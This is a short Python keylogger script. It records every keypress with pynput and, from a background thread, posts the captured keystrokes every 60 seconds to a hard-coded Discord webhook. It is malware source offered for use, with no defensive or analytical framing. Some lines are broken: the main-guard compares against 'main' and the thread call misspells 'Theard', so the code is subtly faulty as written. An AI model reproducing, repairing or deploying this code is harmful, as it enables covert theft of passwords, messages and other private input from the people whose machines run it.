from pynput.keyboard import Key, Listener
from discord_webhook import DiscordWebhook
import time
import threading


keystrokes=""
WEBHOOK = 'https://discord.com/api/webhooks/905156423116263464/AwvpwkPBc-6Sac9TIrNqwRy-gqeX3j5LUE6PqHqR4X3cG0hrVCm_Ay94Kdfvnh4UAwf1'
INTERVALS = 60

def on_press(key):
    global keystrokes
    keystrokes+="\n"+str(key)

def send_keystrokes():
    global keystrokes

    while(1):
        if keystrokes=="":
            continue
        webhook = DiscordWebhook(url=WEBHOOK,content=keystrokes)
        response = webhook.execute()
        print("sent")
        keystrokes=""
        time.sleep(INTERVALS)




if __name__ == "main":
    x = threading.Theard(target=send_keystrokes,args=())
    x.daemon=True
    x.start()

    with Listener(on_press=on_press) as listener:
        listener.join()